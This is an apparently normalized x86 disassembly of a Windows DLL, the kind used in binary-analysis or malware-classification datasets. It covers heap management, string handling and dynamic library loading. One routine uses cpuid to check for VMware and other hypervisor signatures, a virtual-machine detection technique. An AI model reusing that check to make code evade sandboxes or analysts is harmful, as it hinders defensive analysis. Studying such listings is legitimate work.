call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x4c ]
mov eax 0x10b
mov [ edi ] 0x0
call sub_10053240
mov edx [ esi + 0x20 ]
push 0xffffffff
push edx
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
ja r-xdata
lea edx [ ebp - 0x48 ]
mov eax 0x124
call sub_10053240
cmp eax 0xffffffff
je r-xdata
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x11f
lea edx [ ebp - 0x74 ]
mov eax 0x6d
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax 0x66
jmp r-xdata
test eax eax
je r-xdata
call sub_10053240
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x3c ]
mov eax 0xed
call sub_10053240
mov [ edi ] 0x1
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
cmp eax 0x80
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0x57
call sub_10053240
mov [ edi ] 0x1
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_1005a310
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_10039af0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1005a340
push ebp
mov ebp esp
push 0xffffffff
push sub_100862d1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov esi ecx
mov [ ebp - 0xc0 ] esi
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xa8 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb8 ] ebx
mov [ ebp - 0x4 ] 0x2
cmp esi ebx
jne r-xdata
lea edx [ ebp - 0x3c ]
mov eax 0xd3
call sub_10045930
push esi
lea edx [ ebp - 0xac ]
lea ecx [ ebp - 0x3c ]
call sub_10062be0
test eax eax
jne r-xdata
lea esi [ ebp - 0xbc ]
call sub_1002b580
lea esi [ ebp - 0xb4 ]
call sub_1002b580
lea esi [ ebp - 0xac ]
call sub_1002b580
lea eax [ ebx + 0x1 ]
jmp r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xdd
call sub_10045930
push esi
lea edx [ ebp - 0xb4 ]
lea ecx [ ebp - 0xa4 ]
call sub_10062be0
test eax eax
jne r-xdata
mov eax [ ebp - 0xac ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x70 ]
mov eax 0x15a
call sub_10045930
push esi
lea edx [ ebp - 0xbc ]
lea ecx [ ebp - 0x70 ]
call sub_10062be0
test eax eax
jne r-xdata
mov eax [ ebp - 0xb4 ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
lea esi [ ebp - 0xbc ]
call sub_1002b580
lea esi [ ebp - 0xb4 ]
call sub_1002b580
lea esi [ ebp - 0xac ]
call sub_1002b580
xor eax eax
mov eax [ ebp - 0xbc ]
mov edx [ eax ]
mov esi 0x104
mov eax rw-data
xor edi edi
mov edi edi
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
cmp esi ebx
jne r-xdata
movzx ecx [ edx ]
cmp cx bx
je r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp - 0xc0 ]
lea esi [ ebp - 0xbc ]
call sub_1002b580
lea esi [ ebp - 0xb4 ]
call sub_1002b580
lea esi [ ebp - 0xac ]
call sub_1002b580
mov eax 0x2
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
xor edx edx
mov [ eax ] dx
cmp edi ebx
jge r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
add edx 0x2
dec esi
jne r-xdata
mov esi [ ebp - 0xc0 ]
lea esi [ ebp - 0xbc ]
call sub_1002b580
lea esi [ ebp - 0xb4 ]
call sub_1002b580
lea esi [ ebp - 0xac ]
call sub_1002b580
mov eax 0x3
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
lea esi [ ebp - 0xbc ]
call sub_1002b580
lea esi [ ebp - 0xb4 ]
call sub_1002b580
lea esi [ ebp - 0xac ]
call sub_1002b580
mov eax 0x4
jmp r-xdata
lea ecx [ esi + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
sub_1005a5dc
mov edi edi
push esi
mov esi ecx
mov ecx [ esi ]
test ecx ecx
je r-xdata
and [ esi ] 0x0
mov [ esi + 0x4 ] 0x1
pop esi
retn
call sub_1001f06c
mov ecx 0xffff
cmp cx ax
je r-xdata
mov [ esi + 0x4 ] 0x0
pop esi
retn
sub_1005a610
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov eax 0x40000000
cpuid
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0xc ]
pop ebx
cmp eax 0x61774d56
jne r-xdata
cmp eax 0x70726c20
jne r-xdata
cmp [ ebp - 0x4 ] 0x4d566572
jne r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x68797065
jne r-xdata
cmp [ ebp - 0x8 ] 0x65726177
jne r-xdata
cmp [ ebp - 0x8 ] 0x72762020
jne r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_1005a680
push ebp
mov ebp esp
push 0xffffffff
push sub_10088972
mov eax [ fs : 0x0 ]
push eax
mov eax 0x8438
call sub_10080470
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov esi edi
call sub_100218f0
test eax eax
je r-xdata
mov eax 0x1
jmp r-xdata
xor eax eax
push 0x831c
push eax
lea ecx [ ebp - 0x83ce ]
push ecx
mov [ ebp - 0x83d0 ] ax
call sub_1007f940
add esp 0xc
cmp [ edi + 0x90 ] 0x0
mov esi 0x8
jne r-xdata
lea edx [ ebp - 0x50 ]
mov eax 0x11e
call sub_10045930
mov eax edx
push eax
lea ecx [ ebp - 0x83ec ]
lea ebx [ edi + 0xc ]
push ecx
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x7
mov [ ebp - 0x4 ] 0x0
call sub_100205a0
cmp [ ebp - 0x83d8 ] 0x8
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x90 ]
test eax eax
jne r-xdata
cmp [ edi + 0x84 ] esi
lea eax [ edi + 0x70 ]
jb r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0x83ec ]
push edx
call sub_100187af
add esp 0x4
push 0x1
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x8444 ] eax
test eax eax
jne r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0x8b
call sub_10045930
push edx
lea eax [ ebp - 0x83ec ]
lea ebx [ edi + 0xc ]
push eax
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x7
mov [ ebp - 0x4 ] 0x1
call sub_100205a0
cmp [ ebp - 0x83d8 ] esi
jb r-xdata
push eax
call [ LoadLibraryW@IAT ]
mov [ edi + 0x90 ] eax
mov eax [ eax ]
push edi
lea eax [ ebp - 0x83d0 ]
call sub_100311b0
lea edx [ ebp - 0x88 ]
mov eax 0x152
call sub_10045930
lea edx [ ebp - 0xb0 ]
mov eax 0x148
call sub_10045930
mov ecx edx
push ecx
lea edx [ ebp - 0x8408 ]
lea ebx [ edi + 0xc ]
push edx
call sub_10017cc0
push eax
lea edx [ ebp - 0x88 ]
lea esi [ ebp - 0x8440 ]
mov [ ebp - 0x4 ] 0x3
call sub_1001ccb0
push eax
lea edx [ ebp - 0x83d0 ]
lea esi [ ebp - 0x8424 ]
mov [ ebp - 0x4 ] 0x4
call sub_1001ccb0
add esp 0x10
mov edx eax
mov ecx 0x7
mov [ ebp - 0x4 ] 0x5
call sub_100205a0
mov ecx esi
call sub_10019100
lea ecx [ ebp - 0x8440 ]
call sub_10019100
lea ecx [ ebp - 0x8408 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10019100
lea eax [ ebp - 0x83d0 ]
push eax
call [ ebp - 0x8444 ]
mov [ edi + 0x50 ] eax
lea ecx [ edi + 0x94 ]
add edi 0xb4
call sub_10068f40
xor eax eax
lea edx [ ebp - 0x64 ]
mov eax 0x15b
call sub_10045930
push edx
lea eax [ ebp - 0x83ec ]
lea ebx [ edi + 0xc ]
push eax
call sub_10017cc0
add esp 0x8
mov edx eax
mov ecx 0x7
mov [ ebp - 0x4 ] 0x2
call sub_100205a0
lea ecx [ ebp - 0x83ec ]
call sub_10019100
mov eax 0x4
jmp r-xdata
mov eax 0x3
jmp r-xdata
mov ecx [ ebp - 0x83ec ]
push ecx
call sub_100187af
add esp 0x4
sub_1005a908
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x24 ]
lea eax [ edi + 0x8 ]
push eax
push 0x17
xor ebx ebx
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
mov [ ebp - 0x4 ] ecx
call sub_1001f0b8
mov esi [ ebp + 0x20 ]
add esp 0x18
or [ esi ] eax
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
or [ esi ] 0x2
cmp [ ebp + 0x10 ] bl
jne r-xdata
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
cmp [ ebp + 0x11 ] 0x3a
jne r-xdata
lea ecx [ ebp + 0xc ]
call sub_10045d3b
lea ecx [ ebp + 0xc ]
call sub_1005f1e2
lea eax [ edi + 0x4 ]
push eax
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1001f0b8
add esp 0x18
or [ esi ] eax
jmp r-xdata
lea ecx [ ebp + 0xc ]
call sub_1005f1e2
push edi
push 0x3b
push ebx
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_1001f0b8
add esp 0x18
or [ esi ] eax
jmp r-xdata
cmp [ esi ] ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
pop edi
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop esi
mov [ eax + 0x4 ] ecx
pop ebx
leave
retn 0x20
sub_1005a9d0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x18
push esi
mov esi [ ecx + 0x3a0 ]
mov ecx [ ecx + 0x3a4 ]
xor eax eax
push edi
cmp esi ecx
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edi [ esi ]
cmp edx [ edi ]
je r-xdata
mov eax edi
mov ecx [ eax + 0x30 ]
mov edx [ ecx + 0x4 ]
test [ eax + edx + 0x3c ] 0x6
jne r-xdata
add esi 0x4
cmp esi ecx
jne r-xdata
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0xc ] ecx
xor ecx ecx
mov [ esp + 0x14 ] ecx
mov ecx [ eax + edx + 0x68 ]
mov eax [ ecx ]
mov eax [ eax + 0x28 ]
push 0x2
push 0x1
push 0x0
push 0x0
lea edx [ esp + 0x18 ]
push edx
call eax
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0xc ] ecx
xor ecx ecx
sub eax edi
mov [ esp + 0x14 ] ecx
add eax ecx
mov eax [ eax + esi + 0x68 ]
mov edx [ eax ]
mov edx [ edx + 0x28 ]
push 0x2
push 0x1
push 0x0
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
mov ecx eax
call edx
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
sub eax edi
add eax ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
push 0x0
lea edi [ eax + ecx ]
mov eax [ ebp + 0x8 ]
mov ecx [ esi ]
push edx
push eax
add ecx 0x30
push ecx
call sub_10070ad0
mov esi [ esi ]
mov edx [ esi + 0x30 ]
mov eax [ edx + 0x4 ]
test [ eax + esi + 0x3c ] 0x6
jne r-xdata
sub_1005aad0
push ebp
mov ebp esp
push 0xffffffff
push sub_10084ca0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
push 0x10
mov [ ebp - 0x4 ] 0x0
call sub_1001f84c
add esp 0x4
test eax eax
je r-xdata
xor eax eax
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov edx [ ebp + 0x8 ]
push eax
push edx
mov ecx esi
call sub_10028c50
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_1005ab70
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov eax edx
push edi
mov [ ebp - 0x4 ] 0x0
lea edi [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
mov ecx esi
call sub_1005ddc0
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1005abd0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008668f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0x1c ]
xor edi edi
push 0x4
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
mov [ esi + 0x14 ] eax
push edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x1c ] eax
inc [ eax ]
push 0x4
mov [ ebp - 0x4 ] edi
push edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x24 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x2c ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
xor eax eax
mov [ eax ] edi
jmp r-xdata
mov [ esi + 0x34 ] eax
inc [ eax ]
push 0x4
push edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
call [ GetProcessHeap@IAT ]
push eax
call ebx
cmp eax edi
je r-xdata
mov [ ebp - 0x4 ] 0x4
dec [ ebx ]
jne r-xdata
mov edx [ eax + 0x4 ]
dec [ edx ]
cmp [ edx ] edi
jne r-xdata
mov [ esi + 0x3c ] eax
inc [ eax ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
call sub_1000be60
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
mov ebx [ eax + 0x4 ]
inc [ ebx ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ebx
lea edx [ ebp - 0x18 ]
lea eax [ esi + 0x28 ]
mov [ ebp - 0x4 ] 0x5
cmp eax edx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x1c
cmp ecx edi
je r-xdata
mov [ esi + 0x28 ] ecx
mov [ esi + 0x2c ] ebx
inc [ ebx ]
mov eax [ eax ]
cmp eax edi
je r-xdata
push ebx
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov eax [ esi + 0x2c ]
cmp eax edi
je r-xdata
mov edx [ eax ]
mov ecx eax
mov eax [ edx ]
push 0x1
call eax
mov ecx [ ebp - 0x18 ]
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0x18 ]
sub_1005ad64
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_1005adc0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn 0x10
add ecx 0x18
mov [ ebp - 0x14 ] ecx
mov [ edi ] al
add esi 0x2
inc edi
cmp esi ebx
jne r-xdata
mov al [ ebp - 0xc ]
mov ecx [ ebp - 0x14 ]
movzx eax [ esi ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x10 ] 0x0
call sub_10026e29
add esp 0x10
cmp eax 0x1
mov al [ ebp + 0x10 ]
jne r-xdata
sub_1005ae30
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
test [ ebp + 0x8 ] 0x1
mov [ esi + 0xc ] 0x0
mov [ esi + 0x10 ] 0x0
mov [ esi + 0x14 ] 0x0
je r-xdata
push eax
call sub_100187af
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1005ae90
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ edi ]
test esi esi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov esi eax
mov eax 0x2
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi + 0x4 ] eax
mov esi eax
test esi esi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
mov ecx eax
call sub_10012fd0
jmp r-xdata
push 0x20
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea eax [ esi + 0x1 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x0
pop esi
xor eax eax
pop ebx
pop ecx
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
je r-xdata
sub_1005af1f
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1006113d
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8
pop ebp
retn
sub_1005af59
push 0x4
mov eax sub_100851ea
call sub_100624bc
mov eax [ ebp + 0xc ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov edi [ ebp + 0x10 ]
and eax 0x2
mov [ ebp - 0x10 ] eax
je r-xdata
mov eax [ ebp + 0xc ]
and eax 0x8
mov [ ebp + 0x10 ] eax
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_10034ec0
push esi
push eax
push edi
call sub_1000673f
add esp 0x10
push 0x18
call sub_1001f84c
pop ecx
cmp eax ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_10012593
push esi
push eax
push edi
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
mov ecx eax
call sub_1002ed30
mov esi eax
jmp r-xdata
push [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_10054074
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_1006dfe3
push [ ebp + 0x14 ]
push edi
push [ ebp + 0xc ]
push esi
call sub_10061e96
mov eax [ ebp + 0xc ]
or [ edi + 0x10 ] eax
mov eax [ esi + 0x1c ]
add esp 0x30
cmp eax ebx
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_1003df09
push esi
push eax
push edi
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push edi
call sub_1000673f
add esp 0xc
jmp r-xdata
push eax
lea ecx [ edi + 0x18 ]
call sub_1004ed30
mov eax edi
call sub_10013ab8
retn
lea eax [ esi + 0x20 ]
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_1001842e
push esi
push eax
push edi
call sub_1000673f
add esp 0x10
push 0x8
call sub_1001f84c
pop ecx
cmp eax ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push edi
call sub_1000673f
add esp 0xc
jmp r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_100188c2
push esi
push eax
push edi
call sub_1000673f
add esp 0x10
push 0x18
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x10 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push edi
call sub_1000673f
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push edi
call sub_1000673f
add esp 0xc
jmp r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
call sub_1003f5f7
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_100389e0
push eax
push esi
push edi
call sub_1000673f
add esp 0xc
jmp r-xdata
sub_1005b1c7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_1006299d
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_1007f940
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1007f5d0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_1006299d
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_100427ff
mov eax esi
jmp r-xdata
sub_1005b23c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_1005b270
push ebp
mov ebp esp
mov edx [ ebx + 0x8 ]
cmp edx 0x1ffffffe
jb r-xdata
inc edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
xor al al
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_100187af
add esp 0x4
push r--data
call sub_1000831a
cmp [ ebp + 0xc ] al
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ ebx + 0x4 ]
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov [ ecx + 0x8 ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x14 ] al
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov [ ecx + 0x14 ] 0x1
pop edi
pop ebp
retn 0xc
push esi
mov esi [ esi ]
cmp [ esi + 0x14 ] al
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] al
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
